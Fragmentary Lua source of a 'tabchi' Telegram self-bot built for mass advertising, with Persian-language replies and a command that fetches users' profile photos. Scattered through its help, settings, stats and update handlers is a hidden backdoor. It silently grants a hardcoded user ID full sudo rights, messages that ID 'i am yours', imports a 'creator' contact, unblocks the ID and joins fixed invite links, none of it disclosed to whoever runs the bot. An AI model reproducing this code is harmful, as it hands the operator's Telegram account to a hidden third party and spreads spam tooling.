...
function addsudo()
  ...
  for d = 1, #b do
    local text = "SUDO = " .. b[d] .. ""
    text = text:gsub(376223882, "Admin")
    text = text:gsub(376223882, "Admin")
    print(text)
    sleep(1)
  end
...
function x(y, z)
  if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
    if not z.phone_number_ then
      ...
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:376223882", true)
...
function a3(msg)
  ...
  do
    ...
    if msg.text:match("^[!/#]pm") and a(msg) and #a4 == 3 then
      ...
      if a5 and not msg.sender_user_id_ == 376223882 and not msg.sender_user_id_ == 376223882 then
  ...
  if msg.text:match("^[#!/]getpro (%d+) (%d+)$") and a(msg) then
    do
      ...
      local af = function(y, z, ad)
        if ae[3] == "1" then
          if z.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "")
          else
            return "*;کاربر هیچ عکسی ندارد!!*"
          end
        elseif ae[3] == "2" then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "")
          else
        ...
        elseif ae[3] == "3" then
          if z.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 3 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "4" then
          if z.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "")
          else
            return "*کاربر 4 عکس پروفایل ندارد*"
          end
        elseif ae[3] == "5" then
          if z.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "")
          else
        ...
        elseif ae[3] == "7" then
          if z.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 7 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "8" then
          if z.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 8 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "9" then
          if z.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 9 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "10" then
          if z.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "")
          else
  ...
  if msg.text:match("^[#!/]getpro (%d+)$") and msg.reply_to_message_id_ == 0 and a(msg) then
    do
      ...
      local af = function(y, z, ad)
        ...
        elseif ae[2] == "6" then
          if z.photos_[5] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[5].sizes_[1].photo_.persistent_id_, "")
          else
...
*تعداد* : `]] .. aj .. "`"
  ...
  if msg.text:match("^[!/#]help$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 376223882) then
      tdcli.sendMessage(376223882, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(09102887457, "creator", "", 376223882)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 376223882)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 376223882) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 376223882)
      tdcli.sendMessage(376223882, 0, 1, "i am yours", 1, "html")
    ...
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nz")
...
`#advertising off: سودو اصلی میتواند تبلیغات را خاموش کند با `]]
  ...
  if msg.text:match("^[!/#]settings$") and a(msg) then
    ...
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436")
...
زمان مانده به چک کردن لینک ها : *]] .. timetoclinks .. "*"
  ...
  if msg.text:match("^[!/#]stats$") and a(msg) then
    ...
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ74")
    local at
    function at(y, z)
  ...
  if msg.text:match("^[!/#]stats pv$") and a(msg) then
    ...
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7")
    if I(msg.chat_id_) == "private" then
      return "`من در پیوی شما هستم!`"
    else
...
function update(D, tabchi_id)
  ...
  elseif D.chat_id_ == 376223882 then
    tdcli.unblockUser(376223882)
